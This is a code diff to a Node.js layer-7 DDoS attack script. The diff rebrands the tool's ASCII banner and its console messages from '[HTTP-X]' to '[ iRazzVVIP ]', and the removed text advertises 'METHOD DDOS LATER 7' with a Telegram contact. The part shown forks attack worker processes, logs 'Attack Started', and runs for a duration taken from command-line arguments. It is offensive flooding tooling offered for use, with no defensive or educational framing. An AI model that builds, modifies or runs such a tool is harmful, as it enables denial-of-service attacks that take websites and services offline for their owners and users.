@@ -105,21 +105,22 @@ if (cluster.isMaster){
   console.clear();
   console.log(`
  
-          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
-          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
-          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
-           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService                  
-                        Press Ctrl+Z To Stop DDoS
+          ██    ██████╗  █████╗ ███████╗███████╗
+                ██╔══██╗██╔══██╗╚══███╔╝╚══███╔╝
+          ██   ██████╔╝███████║  ███╔╝   ███╔╝ 
+          ██   ██╔══██╗██╔══██║ ███╔╝   ███╔╝  
+          ██   ██║  ██║██║  ██║███████╗███████╗
+               ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝                 
 `);
   
   for (let i = 1; i <= process.argv[5]; i++){
     cluster.fork();
-    console.log(`${getCurrentTime()} [HTTP-X]  Attack Thread ${i} Started`);
+    console.log(`${getCurrentTime()} [ iRazzVVIP ] ${i} Thread Has Succsessfully Sent!`);
   }
-  console.log(`${getCurrentTime()} [HTTP-X]  The Attack Has Started`);
+  console.log(`${getCurrentTime()} [ iRazzVVIP ] Attack Started!`);
   setInterval(getStatus, 2000);
   setTimeout(() => {
-    console.log(`${getCurrentTime()} [HTTP-X]  The Attack Is Over`);
+    console.log(`${getCurrentTime()} [ iRazzVVIP ] Attack Has Ended.`);
     process.exit(1);
   }, process.argv[3] * 1000);
 } 
